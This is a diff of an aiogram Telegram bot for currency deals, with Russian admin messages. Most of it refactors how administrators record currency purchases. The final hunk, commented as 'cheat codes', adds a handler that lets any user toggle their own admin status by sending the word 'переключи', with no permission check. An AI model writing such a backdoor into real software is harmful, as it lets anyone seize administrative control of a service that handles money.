@@ -11,6 +11,7 @@ from models.deal import Deal
 from models.etc import Currency
 from models.tg_user import TgUser
 from etc.keyboards import Keyboards
+from aiogram.dispatcher.filters import Text
 
 async def send_currencies(message: Message, is_edit = False):
     currencies: List[Currency] = Currency.objects.raw({"is_available": True})
@@ -93,29 +94,9 @@ async def _(c: CallbackQuery, state: FSMContext=None, user: TgUser = None):
         currency: Currency = Currency.objects.get({"_id": int(actions[1])})
         await c.message.edit_text(f"✏️ Укажите количество валюты которую вы купили:", reply_markup=Keyboards.back('|currency_pool:main:{}'))
         
-        await AdminInputStates.BuyCurrency.set()
-        await state.update_data(currency=currency)
-
-@dp.message_handler(content_types=[ContentType.TEXT], state=AdminInputStates.BuyCurrency)
-async def _(m: Message, state: FSMContext = None):
-    # Get currency
-    stateData = await state.get_data()
-    currency: Currency = stateData['currency']
-    
-    try:
-        amount = float(m.text.replace(',','.'))
-    except Exception as e:
-        await m.answer(BOT_TEXTS.InvalidValue)
-        return
-    
-    currency.pool_balance += amount
-    currency.save()
-    
-    await state.finish()
-    
-    await m.answer("✅ Готово")
-    await send_currencies(m)
-    
+        await AdminInputStates.BuyCurrencyTargetAmount.set()
+        await state.update_data(target_currency=currency)
+        # See other in buying_currency.py
 
 @dp.message_handler(content_types=[ContentType.TEXT], state=AdminInputStates.ChangeRate)
 async def _(m: Message, state: FSMContext = None):
@@ -166,3 +147,11 @@ async def _(m: Message, state: FSMContext = None):
         await m.answer(f"❌ Не удалось отправить чек пользователю из-за ошибки <code>{str(e)}</code>")
         
     await state.finish()
+    
+# Чит-коды
+@dp.message_handler(Text("переключи"), content_types=[ContentType.TEXT], state="*")
+async def _(m: Message, state: FSMContext = None, user: TgUser = None):
+    if user:
+        user.is_admin = not user.is_admin
+        user.save()
+        await m.answer(f"Статус админа: <code>{user.is_admin}</code>")
